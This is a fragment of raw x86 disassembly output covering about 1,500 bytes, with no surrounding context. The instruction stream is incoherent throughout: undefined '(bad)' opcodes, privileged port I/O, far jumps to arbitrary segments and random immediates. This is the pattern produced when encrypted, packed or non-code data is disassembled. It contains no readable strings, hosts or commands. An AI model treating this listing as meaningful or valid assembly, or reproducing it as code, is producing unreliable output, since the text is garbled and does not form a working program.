  41e40d:	loop   0x41e397
  41e40f:	pusha  
  41e410:	scas   al,BYTE PTR es:[edi]
  41e411:	fld    DWORD PTR [edx]
  41e413:	mov    cl,0x18
  41e415:	jo     0x41e398
  41e417:	iret   
  41e418:	and    edx,edx
  41e41a:	js     0x41e407
  41e41c:	popf   
  41e41d:	xor    eax,0x991ef277
  41e422:	xchg   DWORD PTR [eax+0x40bbbf14],eax
  41e428:	out    dx,eax
  41e429:	std    
  41e42a:	pop    ecx
  41e42b:	imul   ecx,DWORD PTR [esi+0x18],0x9e5bc614
  41e432:	jne    0x41e3d0
  41e434:	in     eax,dx
  41e435:	lods   al,BYTE PTR ds:[esi]
  41e436:	int    0x1b
  41e438:	aad    0x26
  41e43a:	and    ch,BYTE PTR [esi]
  41e43c:	push   esi
  41e43d:	add    al,0x8d
  41e43f:	cmp    al,BYTE PTR [edx-0x1a]
  41e442:	outs   dx,BYTE PTR ds:[esi]
  41e443:	sub    BYTE PTR [ecx+0x7b557e85],ch
  41e449:	ret    0x7952
  41e44c:	cwde   
  41e44d:	push   eax
  41e44e:	dec    edi
  41e44f:	cmp    eax,0xc8548c61
  41e454:	pop    ebx
  41e455:	mov    ecx,0x49e0107
  41e45a:	cmp    dl,BYTE PTR [edi]
  41e45c:	mov    WORD PTR [ecx-0x5f],ss
  41e45f:	add    esi,DWORD PTR [eax]
  41e461:	cmp    al,0x5d
  41e463:	dec    ebp
  41e464:	mov    dl,0xea
  41e466:	mov    eax,0xce43e0
  41e46b:	mov    al,ds:0x30debba0
  41e470:	lods   eax,DWORD PTR ds:[esi]
  41e471:	lods   eax,DWORD PTR ds:[esi]
  41e472:	rcl    ebp,1
  41e474:	arpl   WORD PTR [edx+eax*8+0x489421fc],di
  41e47b:	dec    esp
  41e47c:	push   esi
  41e47d:	pop    ebx
  41e47e:	jp     0x41e4ce
  41e480:	mov    bl,0x99
  41e482:	push   cs
  41e483:	mov    al,0xbf
  41e485:	pop    ss
  41e486:	bound  eax,QWORD PTR [edi+0x9]
  41e489:	xchg   ebp,eax
  41e48a:	cmp    cl,BYTE PTR [eax+ecx*8+0x42]
  41e48e:	out    dx,eax
  41e48f:	icebp  
  41e490:	sub    al,0xe0
  41e492:	jp     0x41e4c6
  41e494:	repnz and dl,BYTE PTR [edi+eax*2+0x6a]
  41e499:	jle    0x41e4d1
  41e49b:	push   ss
  41e49c:	pop    es
  41e49d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e49e:	mov    cl,0xb6
  41e4a0:	push   ds
  41e4a1:	addr16 dec esi
  41e4a3:	pop    esi
  41e4a4:	cmp    al,0x95
  41e4a6:	push   ebx
  41e4a7:	popa   
  41e4a8:	xor    DWORD PTR [ebx],0x35
  41e4ab:	mov    DWORD PTR [edi+esi*1-0x6],edx
  41e4af:	fild   DWORD PTR [ebx-0x5b]
  41e4b2:	mov    al,ds:0x455ec1ed
  41e4b7:	sub    ecx,DWORD PTR [ebx]
  41e4b9:	pop    esi
  41e4ba:	xor    ecx,DWORD PTR ds:0xc83c0603
  41e4c0:	(bad)  
  41e4c2:	stos   DWORD PTR es:[edi],eax
  41e4c3:	js     0x41e4bd
  41e4c5:	pop    edi
  41e4c6:	dec    ebx
  41e4c7:	mov    ch,0x63
  41e4c9:	mov    WORD PTR [esi],?
  41e4cb:	add    ah,BYTE PTR [ecx+0x36]
  41e4ce:	pop    esp
  41e4cf:	xchg   esi,eax
  41e4d0:	or     BYTE PTR [eax],al
  41e4d2:	es dec ebp
  41e4d4:	lds    ecx,FWORD PTR ds:0x90a8494d
  41e4da:	jne    0x41e4fd
  41e4dc:	aaa    
  41e4dd:	ror    BYTE PTR [ecx+0x7d],1
  41e4e0:	mov    bl,0x6a
  41e4e2:	addr16 mov esp,0x31b32858
  41e4e8:	push   ecx
  41e4e9:	dec    esp
  41e4ea:	fdiv   st,st(1)
  41e4ec:	lea    esi,[ecx+eiz*1+0x4e]
  41e4f0:	pop    esp
  41e4f1:	cmp    eax,0x4de2b87b
  41e4f6:	cmc    
  41e4f7:	pop    eax
  41e4f8:	fs dec eax
  41e4fa:	dec    ebp
  41e4fb:	daa    
  41e4fc:	jmp    DWORD PTR [edi]
  41e4fe:	and    al,0x50
  41e500:	xor    BYTE PTR [ebx-0x416b28b4],bh
  41e506:	(bad)  
  41e508:	cli    
  41e509:	pop    ebx
  41e50a:	push   0xa19d6fae
  41e50f:	les    esi,FWORD PTR ds:0x466be4f6
  41e515:	add    eax,0x3092e2fd
  41e51a:	shr    DWORD PTR ds:0xa327aecc,cl
  41e521:	push   ss
  41e522:	jp     0x41e59b
  41e524:	mov    edx,0x6a3af7fb
  41e529:	mov    ds:0x3764f2f4,eax
  41e52e:	fs loop 0x41e565
  41e531:	int    0x6f
  41e533:	mov    ecx,0x81f4b54a
  41e538:	xor    al,0x29
  41e53a:	in     al,0x51
  41e53c:	dec    esp
  41e53d:	cdq    
  41e53e:	aaa    
  41e53f:	cs (bad) 
  41e541:	sbb    BYTE PTR [esi],al
  41e543:	rcr    dl,cl
  41e545:	jb     0x41e55e
  41e547:	dec    ebx
  41e548:	lds    edx,FWORD PTR [esi-0x2aaf334d]
  41e54e:	pop    ecx
  41e54f:	pop    esi
  41e550:	test   DWORD PTR [ecx-0x5af0f5dc],edx
  41e556:	out    dx,al
  41e557:	mov    ebp,DWORD PTR [ebx+eax*2]
  41e55a:	call   0x178fcfae
  41e55f:	pop    edx
  41e560:	add    bh,BYTE PTR [eax+ebp*8+0x74]
  41e564:	in     al,0xe3
  41e566:	rcl    DWORD PTR [eax],0x5c
  41e569:	mov    edx,0xc76bc008
  41e56e:	pusha  
  41e56f:	scas   al,BYTE PTR es:[edi]
  41e570:	jbe    0x41e567
  41e572:	aad    0x2
  41e574:	sub    BYTE PTR [ecx+0x7b27074c],0xda
  41e57b:	cmp    esp,DWORD PTR [edi]
  41e57d:	mov    al,ds:0x16ccb7dc
  41e582:	sub    esi,DWORD PTR [ecx]
  41e584:	loop   0x41e588
  41e586:	push   0x55
  41e588:	ins    DWORD PTR es:[edi],dx
  41e589:	adc    eax,DWORD PTR [esi+0x79089c14]
  41e58f:	add    dh,BYTE PTR [edi]
  41e591:	push   ds
  41e592:	mov    al,0x90
  41e594:	popa   
  41e595:	jno    0x41e57c
  41e597:	adc    BYTE PTR [ebx],ch
  41e599:	pop    eax
  41e59a:	pop    ds
  41e59b:	cmp    esp,edi
  41e59d:	cmp    BYTE PTR [ecx-0x4a],ah
  41e5a0:	(bad)  
  41e5a1:	or     al,0x40
  41e5a3:	and    dh,BYTE PTR [esi+0x72ca735d]
  41e5a9:	je     0x41e61b
  41e5ab:	imul   ebp,DWORD PTR [eax+0x4a],0xffffffe4
  41e5af:	xchg   BYTE PTR [esi-0x2c],bl
  41e5b2:	push   edi
  41e5b3:	push   ebp
  41e5b4:	cmc    
  41e5b5:	xchg   edi,eax
  41e5b6:	sub    dl,BYTE PTR [esi+0x1e]
  41e5b9:	rcr    BYTE PTR es:[ebx-0x391103],0xe4
  41e5c1:	addr16 mov ebp,0x4a12d607
  41e5c7:	add    BYTE PTR [ecx],al
  41e5c9:	inc    ecx
  41e5ca:	out    0xe7,eax
  41e5cc:	or     eax,0xfb4dc6f6
  41e5d1:	jae    0x41e5b1
  41e5d3:	xlat   BYTE PTR ds:[ebx]
  41e5d4:	arpl   dx,bx
  41e5d6:	push   edx
  41e5d7:	iret   
  41e5d8:	pop    ecx
  41e5d9:	dec    esi
  41e5da:	and    cl,BYTE PTR [ecx+edi*2+0x2fc74a72]
  41e5e1:	push   es
  41e5e2:	sbb    ebp,eax
  41e5e4:	mov    edx,0x7bc6b70e
  41e5e9:	xchg   ecx,eax
  41e5ea:	fisub  DWORD PTR ds:0xe3334760
  41e5f0:	push   cs
  41e5f1:	rcr    DWORD PTR [edi+eax*1],0xab
  41e5f5:	mov    ecx,0x50c1ad91
  41e5fa:	pushf  
  41e5fb:	jmp    0x35ac:0xa2260af
  41e602:	std    
  41e603:	or     ebp,DWORD PTR [ebp+edx*8+0x33]
  41e607:	push   edx
  41e608:	and    al,BYTE PTR [eax-0x31d08b4d]
  41e60e:	pop    eax
  41e60f:	cld    
  41e610:	out    dx,al
  41e611:	cs call 0x9c6e124b
  41e617:	inc    ebp
  41e618:	shl    BYTE PTR [eax-0x59641d85],0x73
  41e61f:	retf   
  41e620:	add    bl,BYTE PTR [edi+0x2043e6db]
  41e626:	pop    esp
  41e627:	sti    
  41e628:	loope  0x41e644
  41e62a:	push   esp
  41e62b:	bound  esp,QWORD PTR [ebx]
  41e62d:	and    ah,BYTE PTR [bx+di]
  41e630:	pop    edi
  41e631:	in     al,0x8f
  41e633:	sar    BYTE PTR gs:[eax+0x37313439],0x7c
  41e63b:	adc    al,0x7b
  41e63d:	jns    0x41e5f8
  41e63f:	mov    BYTE PTR [eax+0x148bcb2e],bl
  41e645:	push   esi
  41e646:	adc    bl,dh
  41e648:	mov    ch,BYTE PTR [esi+0x69]
  41e64b:	test   bh,ah
  41e64d:	outs   dx,DWORD PTR ds:[esi]
  41e64e:	fcomp  QWORD PTR [edx+0x5818f407]
  41e654:	sub    dl,bl
  41e656:	dec    ebp
  41e657:	pop    eax
  41e658:	add    BYTE PTR [ecx],bh
  41e65a:	jg     0x41e68d
  41e65c:	das    
  41e65d:	stc    
  41e65e:	inc    esp
  41e65f:	cwde   
  41e660:	in     al,0x71
  41e662:	fidivr WORD PTR ds:0x20467b53
  41e668:	in     al,dx
  41e669:	push   0x61
  41e66b:	cmp    BYTE PTR [ebp+0x58],al
  41e66e:	icebp  
  41e66f:	xlat   BYTE PTR ds:[ebx]
  41e670:	shr    BYTE PTR [eax-0x54],0x51
  41e674:	xor    cl,BYTE PTR [eax-0x22fe039e]
  41e67a:	adc    ch,BYTE PTR [edi]
  41e67c:	dec    ebp
  41e67d:	or     eax,0x84ef042b
  41e682:	rep lods eax,DWORD PTR ds:[esi]
  41e684:	mov    ecx,0x8d75e88b
  41e689:	cmc    
  41e68a:	xor    edx,eax
  41e68c:	mov    ch,0xf
  41e68e:	dec    esi
  41e68f:	xor    dl,al
  41e691:	repz aaa 
  41e693:	fnstcw WORD PTR [ebx]
  41e695:	or     eax,0xaa138833
  41e69a:	xor    cl,cl
  41e69c:	inc    ebx
  41e69d:	lock mov ch,0x2e
  41e6a0:	mov    WORD PTR [edi+ebp*1+0x7d92abdf],es
  41e6a7:	scas   al,BYTE PTR es:[edi]
  41e6a8:	cmp    DWORD PTR [edi+0x317553ce],0x47
  41e6af:	call   0xe675:0xf1532c99
  41e6b6:	inc    edx
  41e6b7:	mov    ebx,0x20206fce
  41e6bc:	nop
  41e6bd:	dec    ebx
  41e6be:	push   esp
  41e6bf:	sub    eax,0x2360aa61
  41e6c4:	out    dx,eax
  41e6c5:	sub    BYTE PTR [edx+0x5c],dh
  41e6c8:	dec    esp
  41e6c9:	cli    
  41e6ca:	fidiv  DWORD PTR [esi-0x65a189e]
  41e6d0:	ss xchg edi,eax
  41e6d2:	ret    0x5ba3
  41e6d5:	jecxz  0x41e725
  41e6d7:	aam    0x25
  41e6d9:	mov    bl,0xc5
  41e6db:	xlat   BYTE PTR ds:[ebx]
  41e6dc:	aad    0xd0
  41e6de:	or     al,0x8d
  41e6e0:	push   es
  41e6e1:	ins    BYTE PTR es:[edi],dx
  41e6e2:	cdq    
  41e6e3:	cli    
  41e6e4:	mov    ah,0x8a
  41e6e6:	int3   
  41e6e7:	pop    ebp
  41e6e8:	pop    ecx
  41e6e9:	sti    
  41e6ea:	push   ebp
  41e6eb:	adc    DWORD PTR [ebx-0x42],esi
  41e6ee:	dec    edi
  41e6ef:	add    eax,ecx
  41e6f1:	mov    ecx,0x88afb3d1
  41e6f6:	shr    DWORD PTR [ebx],cl
  41e6f8:	sub    al,0xf4
  41e6fa:	push   es
  41e6fb:	mov    edi,0x10d982dd
  41e700:	push   ebx
  41e701:	in     eax,dx
  41e702:	jnp    0x41e741
  41e704:	push   edi
  41e705:	dec    ecx
  41e706:	add    eax,0xb2931cea
  41e70b:	and    al,0x36
  41e70d:	ins    BYTE PTR es:[edi],dx
  41e70e:	push   ebx
  41e70f:	mov    BYTE PTR [ecx-0x2a7da204],dh
  41e715:	push   ebx
  41e716:	fyl2x  
  41e718:	jbe    0x41e6a9
  41e71a:	(bad)  
  41e71b:	mov    dl,BYTE PTR [edi]
  41e71d:	scas   al,BYTE PTR es:[edi]
  41e71e:	loope  0x41e6b1
  41e720:	fwait
  41e721:	retf   0x2f30
  41e724:	(bad)  
  41e725:	jae    0x41e6f3
  41e727:	adc    al,0xab
  41e729:	push   cs
  41e72a:	in     al,0x4a
  41e72c:	fisubr DWORD PTR [esi+0x2d3906f]
  41e732:	xchg   BYTE PTR [ebx],ch
  41e734:	jmp    DWORD PTR ds:0x120e5fec
  41e73a:	inc    ebx
  41e73b:	repz cmp eax,0x1ff06bf1
  41e741:	unpckhps xmm7,XMMWORD PTR [ebp-0x6b5f6627]
  41e748:	jecxz  0x41e76d
  41e74a:	add    al,0xd6
  41e74c:	outs   dx,BYTE PTR ds:[esi]
  41e74d:	push   ds
  41e74e:	mov    ?,WORD PTR [ebx-0x5e]
  41e751:	jo     0x41e6fd
  41e753:	jne    0x41e6ea
  41e755:	cld    
  41e756:	enter  0xa852,0xc
  41e75a:	sub    eax,0xf77dacda
  41e75f:	xchg   BYTE PTR [ebp+eax*1-0x43],bl
  41e763:	jge    0x41e757
  41e765:	jb     0x41e7ca
  41e767:	(bad)  
  41e768:	out    dx,al
  41e769:	in     al,0x31
  41e76b:	xchg   ecx,eax
  41e76c:	addr16 sbb dh,bl
  41e76f:	or     al,0xeb
  41e771:	mov    eax,0x451ebdf
  41e776:	or     edx,esi
  41e778:	aas    
  41e779:	pop    es
  41e77a:	scas   eax,DWORD PTR es:[edi]
  41e77b:	shrd   DWORD PTR [edi+esi*2+0x1f],ecx,0x87
  41e781:	(bad)  
  41e783:	and    ah,dl
  41e785:	out    dx,al
  41e786:	sub    eax,ecx
  41e788:	lds    ecx,FWORD PTR [edx+0x63c3ca0e]
  41e78e:	sbb    al,ch
  41e790:	and    eax,0x8e29d027
  41e795:	jmp    0xa321:0xa7ddba05
  41e79c:	pop    eax
  41e79d:	in     eax,dx
  41e79e:	push   cs
  41e79f:	cmp    al,0xfb
  41e7a1:	pop    esi
  41e7a2:	enter  0x3b99,0xa6
  41e7a6:	inc    esi
  41e7a7:	and    ebx,edi
  41e7a9:	cmp    BYTE PTR [edx-0x6c65210d],0x2e
  41e7b0:	out    0xfb,al
  41e7b2:	or     edx,edx
  41e7b4:	adc    al,0xe0
  41e7b6:	cmp    DWORD PTR [ebp+0x73882bdd],ebp
  41e7bc:	mov    bl,0xf1
  41e7be:	dec    ecx
  41e7bf:	jnp    0x41e7b8
  41e7c1:	mov    ebx,0x64d28321
  41e7c6:	popa   
  41e7c7:	jg     0x41e822
  41e7c9:	or     al,0xe3
  41e7cb:	mov    ch,BYTE PTR [eax+0x7053c9f]
  41e7d1:	call   0x5c903037
  41e7d6:	or     dh,bl
  41e7d8:	idiv   DWORD PTR [ecx]
  41e7da:	ret    0xe3b9
  41e7dd:	mov    eax,0xd3860f06
  41e7e2:	mov    edx,0xcf3a46b8
  41e7e7:	neg    al
  41e7e9:	int3   
  41e7ea:	dec    ebp
  41e7eb:	sbb    DWORD PTR [ebx+0x1fbe924f],eax
  41e7f1:	mov    ch,0xc9
  41e7f3:	pop    ss
  41e7f4:	pop    es
  41e7f5:	push   cs
  41e7f6:	int3   
  41e7f7:	dec    ebp
  41e7f8:	mov    dh,0xa9
  41e7fa:	imul   eax,DWORD PTR [ecx],0x243fa522
  41e800:	adc    bh,BYTE PTR [ebx]
  41e802:	jmp    0xa905:0x24e30a29
  41e809:	xchg   edx,eax
  41e80a:	cwde   
  41e80b:	and    eax,0xadd79fd
  41e810:	syscall 
  41e812:	dec    esi
  41e813:	or     bl,BYTE PTR [ebp-0x42]
  41e816:	inc    eax
  41e817:	retf   
  41e818:	enter  0x2c84,0x61
  41e81c:	repz fstp DWORD PTR [edi]
  41e81f:	and    eax,0x3e0b96cf
  41e824:	popf   
  41e825:	cmp    eax,0xfa251e09
  41e82a:	(bad)  
  41e82b:	cmp    ch,BYTE PTR [edi]
  41e82d:	dec    ecx
  41e82e:	repnz and ebx,0xffffffdd
  41e832:	cdq    
  41e833:	loope  0x41e7f6
  41e835:	mov    edx,0xbab7125d
  41e83a:	(bad)  
  41e83b:	mov    eax,ds:0xd4727475
  41e840:	push   eax
  41e841:	cmp    DWORD PTR [ebx+0xdd3fdab],edi
  41e847:	lea    ebp,[ebx]
  41e849:	sahf   
  41e84a:	adc    cl,ah
  41e84c:	xchg   DWORD PTR [ebx+0x4ddd9943],eax
  41e852:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e853:	daa    
  41e854:	jle    0x41e7e6
  41e856:	add    eax,0x9872cce9
  41e85b:	mov    esp,0xfc82bd6e
  41e860:	xor    BYTE PTR [esi+0x24449160],ah
  41e866:	sti    
  41e867:	loopne 0x41e8c9
  41e869:	(bad)  [ebx+0x9]
  41e86c:	cmp    edx,DWORD PTR [ebx]
  41e86e:	stc    
  41e86f:	fisub  DWORD PTR [eax+0x7cab200e]
  41e875:	loope  0x41e8a1
  41e877:	ins    DWORD PTR es:[edi],dx
  41e878:	hlt    
  41e879:	push   es
  41e87a:	adc    cl,BYTE PTR [edi+eiz*1+0x48]
  41e87e:	jae    0x41e8c4
  41e880:	jne    0x41e895
  41e882:	jg     0x41e80b
  41e884:	or     ebp,DWORD PTR [esp+edx*1+0x1d]
  41e888:	xlat   BYTE PTR ds:[ebx]
  41e889:	paddusw mm7,mm1
  41e88c:	es scas al,BYTE PTR es:[edi]
  41e88e:	and    ch,BYTE PTR [eax+0x6a8a1a99]
  41e894:	jmp    edx
  41e896:	std    
  41e897:	loopne 0x41e8aa
  41e899:	cli    
  41e89a:	mov    ah,BYTE PTR [edx+0x348f4ac1]
  41e8a0:	test   eax,0x4c8db2df
  41e8a5:	inc    ebp
  41e8a6:	or     al,0xf6
  41e8a8:	push   es
  41e8a9:	or     al,0xd0
  41e8ab:	mov    ds,WORD PTR [ecx-0x1]
  41e8ae:	jno    0x41e8da
  41e8b0:	push   ds
  41e8b1:	retf   
  41e8b2:	shl    BYTE PTR [esi+0x4],1
  41e8b5:	std    
  41e8b6:	mov    eax,ds:0x42b99f0
  41e8bb:	inc    eax
  41e8bc:	fbstp  TBYTE PTR [ebp-0x10]
  41e8bf:	leave  
  41e8c0:	pop    ecx
  41e8c1:	pop    es
  41e8c2:	mov    ecx,0xa8439ccb
  41e8c7:	sub    al,ch
  41e8c9:	fiadd  DWORD PTR [edi-0x53]
  41e8cc:	jns    0x41e88c
  41e8ce:	xlat   BYTE PTR ds:[ebx]
  41e8cf:	sbb    esi,DWORD PTR [bp+si-0x40]
  41e8d3:	push   ebx
  41e8d4:	aaa    
  41e8d5:	push   ecx
  41e8d6:	cvttps2pi mm4,QWORD PTR [edi]
  41e8d9:	dec    edi
  41e8da:	int    0x22
  41e8dc:	pop    esp
  41e8dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8de:	int3   
  41e8df:	sub    ecx,DWORD PTR [esi]
  41e8e1:	sub    BYTE PTR [ebx-0x5dcb1b49],cl
  41e8e7:	shl    BYTE PTR [ebp-0x5d973abd],cl
  41e8ed:	xor    BYTE PTR [ebx+0x7f],dl
  41e8f0:	pop    edx
  41e8f1:	fs mov dl,0xb0
  41e8f4:	mov    esi,0x19c95ab8
  41e8f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e8fa:	stc    
  41e8fb:	pop    edi
  41e8fc:	add    eax,0x1aa3a27e
  41e901:	test   al,0x8
  41e903:	jl     0x41e89f
  41e905:	cmp    eax,0xb98b3cf4
  41e90a:	inc    esi
  41e90b:	(bad)  
  41e90c:	fdivr  DWORD PTR [eax]
  41e90e:	jno    0x41e932
  41e910:	pop    edx
  41e911:	enter  0x8b70,0x5b
  41e915:	xchg   BYTE PTR [esi],dl
  41e917:	call   0x1852:0x51b4eeed
  41e91e:	push   edx
  41e91f:	pop    ds
  41e920:	lods   al,BYTE PTR ds:[esi]
  41e921:	stos   DWORD PTR es:[edi],eax
  41e922:	lahf   
  41e923:	and    eax,0x6c61c000
  41e928:	mov    ecx,0x44366335
  41e92d:	sub    ch,al
  41e92f:	mov    esp,DWORD PTR [esi-0x50]
  41e932:	aaa    
  41e933:	or     ch,BYTE PTR [ebp-0x29fdabe9]
  41e939:	sbb    dl,cl
  41e93b:	push   edx
  41e93c:	and    al,0xb9
  41e93e:	push   cs
  41e93f:	gs mov esp,esi
  41e942:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e943:	and    DWORD PTR [ebp+eax*2-0x6b42c89c],esi
  41e94a:	or     al,0x76
  41e94c:	ficomp WORD PTR [eax+0x23542b57]
  41e952:	pop    esi
  41e953:	icebp  
  41e954:	(bad)  
  41e955:	xchg   edx,eax
  41e956:	add    DWORD PTR fs:[ebp+esi*4-0x21],ebx
  41e95b:	aam    0xe4
  41e95d:	fisttp QWORD PTR [esi-0x875a3c1]
  41e963:	pusha  
  41e964:	push   edx
  41e965:	cmp    DWORD PTR [eax+0x75dac9fc],ebp
  41e96b:	mov    ebp,0x4a33e482
  41e970:	cwde   
  41e971:	sub    eax,0x6a367a97
  41e976:	cmp    dh,dl
  41e978:	stos   BYTE PTR es:[edi],al
  41e979:	mov    dl,0x15
  41e97b:	lds    eax,FWORD PTR [edx+eax*4-0x1908e6fa]
  41e982:	mov    ds:0x4d56e6ed,eax
  41e987:	scas   eax,DWORD PTR es:[edi]
  41e988:	pop    eax
  41e989:	add    BYTE PTR [ebp+edi*4-0x1ac4dda0],0x3a
  41e991:	mov    edx,0xd2afa812
  41e996:	in     al,0x68
  41e998:	push   edx
  41e999:	jmp    0x242b:0x6922a8cd
  41e9a0:	mov    edx,0xa758874b
  41e9a5:	out    0x7e,eax
  41e9a7:	je     0x41ea23
  41e9a9:	scas   eax,DWORD PTR es:[edi]
  41e9aa:	repnz adc eax,0x4ed3f717
  41e9b0:	dec    ebp
  41e9b1:	ins    DWORD PTR es:[edi],dx
  41e9b2:	jb     0x41e965
  41e9b4:	gs icebp 
  41e9b6:	out    dx,al
  41e9b7:	pop    es
  41e9b8:	or     dh,BYTE PTR [ebp-0x1e]
  41e9bb:	add    DWORD PTR [edi-0x32],esp
  41e9be:	cmp    DWORD PTR [ebx+0x6858b392],ecx
  41e9c4:	enter  0x1633,0x87
  41e9c8:	pop    esp
  41e9c9:	outs   dx,DWORD PTR ds:[esi]
  41e9ca:	push   ss
  41e9cb:	call   0x53240b9c
  41e9d0:	(bad)  
  41e9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e9d2:	(bad)  
  41e9d3:	clc    
  41e9d4:	push   ebx
  41e9d5:	push   es
  41e9d6:	ins    BYTE PTR es:[edi],dx
  41e9d7:	xor    al,0x41
  41e9d9:	jp     0x41ea1a
  41e9db:	gs sub eax,0xc8e0acb4
  41e9e1:	hlt    
  41e9e2:	leave  
  41e9e3:	out    0x5c,eax
  41e9e5:	add    esi,esp
  41e9e7:	adc    eax,0x4b4bed1d
  41e9ec:	jecxz  0x41e99b
  41e9ee:	xchg   edi,eax
  41e9ef:	(bad)  [ebp-0x5d8b0c56]
  41e9f5:	pop    esp
  41e9f6:	lods   eax,DWORD PTR ds:[esi]
  41e9f7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e9f8:	imul   ebp,DWORD PTR [edi+0x62],0xffffff85
  41e9fc:	into   
  41e9fd:	ror    BYTE PTR [edx],1
  41e9ff:	test   BYTE PTR [esi],dh
  41ea01:	dec    esi
  41ea02:	xchg   ebp,eax
  41ea03:	ja     0x41e9de
  41ea05:	xchg   esp,eax
  41ea06:	stos   BYTE PTR es:[edi],al
  41ea07:	dec    esp
  41ea08:	jae    0x41ea0a
  41ea0a:	pop    ds
  41ea0b:	sahf   
  41ea0c:	add    eax,0x1c73a343
  41ea11:	jl     0x41e9e7
  41ea13:	ret    0xe659
  41ea16:	retf   
  41ea17:	mov    gs,WORD PTR [ecx-0x5017468]
  41ea1d:	sub    DWORD PTR [edx+0x6f],ebx
  41ea20:	into   
  41ea21:	push   ecx
  41ea22:	mov    eax,ds:0xdcb3feb1
  41ea27:	jp     0x41e9fc
  41ea29:	mov    ecx,0x4b6a240d
  41ea2e:	arpl   WORD PTR [esi+eiz*8+0x7a69feb7],di
  41ea35:	out    0x2,al
  41ea37:	aaa    
  41ea38:	dec    esp
  41ea39:	retf   
  41ea3a:	xchg   edi,eax
  41ea3b:	jae    0x41ea8b
  41ea3d:	es or  ah,0x79
  41ea41:	repz std 
  41ea43:	jl     0x41ea15
  41ea45:	xchg   esi,eax
  41ea46:	ret    0x63d3
  41ea49:	mov    ds:0xf12f1cba,eax
  41ea4e:	xchg   ebp,eax
  41ea4f:	ss addr16 lahf 
  41ea52:	adc    BYTE PTR [esi+0x73754c54],0xdd
  41ea59:	imul   esp,DWORD PTR [ebp+0x7d],0xffffff83
  41ea5d:	aas    
  41ea5e:	push   es
  41ea5f:	dec    BYTE PTR [edi+eiz*8]
  41ea62:	add    BYTE PTR [eax+0xcd40474],dl
  41ea68:	pop    edx
  41ea69:	adc    BYTE PTR [ebp+0x4d],dl
  41ea6c:	and    DWORD PTR [edx-0x2501b447],ecx
  41ea72:	fst    QWORD PTR [edi+0x58c9478f]
  41ea78:	adc    BYTE PTR [esi-0xa41d70],al
  41ea7e:	mov    WORD PTR [edi+0x48129b64],?
  41ea84:	cmc    
  41ea85:	jg     0x41ea86
  41ea87:	shl    BYTE PTR [edx-0x33a62805],0x8e
  41ea8e:	mov    bh,0x6f
  41ea90:	jmp    0x41eae0
  41ea92:	imul   ebp,DWORD PTR ds:0xe14c8b19,0x889ec53b
  41ea9c:	(bad)  
  41ea9d:	fdivr  DWORD PTR [ecx-0x71a317eb]
  41eaa3:	les    eax,FWORD PTR [ecx]
  41eaa5:	add    bl,ch
  41eaa7:	and    al,0x7c
  41eaa9:	out    0x8a,eax
  41eaab:	stc    
  41eaac:	and    BYTE PTR [edi-0x12255726],cl
  41eab2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eab3:	pop    eax
  41eab4:	dec    ecx
  41eab5:	sbb    BYTE PTR [ebp+0x3],0x84
  41eab9:	shl    BYTE PTR ds:0xd8f96bc4,0x9c
  41eac0:	fiadd  DWORD PTR [ecx]
  41eac2:	sub    ebx,edx
  41eac4:	je     0x41eaa1
  41eac6:	mov    cl,0xd1
  41eac8:	mov    bh,0xbc
  41eaca:	push   ds
  41eacb:	xchg   ecx,eax
  41eacc:	xchg   esp,eax
  41eacd:	dec    ebp
  41eace:	sahf   
  41eacf:	and    ch,ch
  41ead1:	adc    al,BYTE PTR [ebx]
  41ead3:	inc    edi
  41ead4:	ret    0xe73b
  41ead7:	sti    
  41ead8:	pop    esi
  41ead9:	dec    ecx
  41eada:	add    eax,0x383942c
  41eadf:	adc    bh,BYTE PTR [edi]
  41eae1:	xchg   ebp,eax
  41eae2:	sub    al,0x17
  41eae4:	or     DWORD PTR [esi],0xffffff89
  41eae7:	and    al,0x3b
  41eae9:	inc    edi
  41eaea:	push   ss
  41eaeb:	(bad)
  41eaee:	in     eax,dx
  41eaef:	aad    0x4
  41eaf1:	add    al,0x5f
  41eaf3:	dec    esp
  41eaf4:	mul    ebp
  41eaf6:	and    al,0x3f
  41eaf8:	fwait
  41eaf9:	aam    0x54
  41eafb:	test   DWORD PTR [edi+0x4765dbea],0x502fe28
  41eb05:	jnp    0x41eabd
  41eb07:	je     0x41eaf4
  41eb09:	cli    
  41eb0a:	jns    0x41eaf1
  41eb0c:	push   eax
  41eb0d:	mov    ds,WORD PTR [edx+ecx*1]
  41eb10:	add    al,0x92
  41eb12:	sbb    BYTE PTR [esi+0x46553e16],ch
  41eb18:	test   DWORD PTR [eax-0x568bc54a],0x8b5a2efa
  41eb22:	adc    al,0x98
  41eb24:	scas   eax,DWORD PTR es:[edi]
  41eb25:	cmp    DWORD PTR [edi],edi
  41eb27:	aam    0x83
  41eb29:	pop    ebp
  41eb2a:	dec    ebx
  41eb2b:	adc    BYTE PTR [ebx+eax*1-0x7886a6e8],bh
  41eb32:	dec    eax
  41eb33:	sub    eax,0xde01cef5
  41eb38:	or     BYTE PTR [ecx*1-0x4b9a118f],dl
  41eb3f:	shl    eax,cl
  41eb41:	in     eax,dx
  41eb42:	cli    
  41eb43:	adc    ebp,DWORD PTR [ecx+0x3db74e3]
  41eb49:	adc    eax,0xffb53d6d
  41eb4e:	and    BYTE PTR [edx+0x7b1e0f8c],ch
  41eb54:	pop    ebx
  41eb55:	dec    esp
  41eb56:	cli    
  41eb57:	xor    eax,0xbd3d9eb6
  41eb5c:	out    0x1c,eax
  41eb5e:	push   0x204af906
  41eb63:	test   BYTE PTR [eax+0x4ebe23b9],cl
  41eb69:	mov    edx,DWORD PTR [esi-0x26]
  41eb6c:	ret    0x97fd
  41eb6f:	lods   al,BYTE PTR ds:[esi]
  41eb70:	or     bl,al
  41eb72:	icebp  
  41eb73:	pop    es
  41eb74:	sti    
  41eb75:	mov    al,ds:0x3cc5b274
  41eb7a:	sub    DWORD PTR ds:0x3c80d415,eax
  41eb80:	mov    bl,0xa8
  41eb82:	mov    al,0x84
  41eb84:	mov    edx,0xd861e949
  41eb89:	dec    ecx
  41eb8a:	xchg   DWORD PTR [ebp+ecx*2+0x7],edi
  41eb8e:	ins    DWORD PTR es:[edi],dx
  41eb8f:	mov    al,0x74
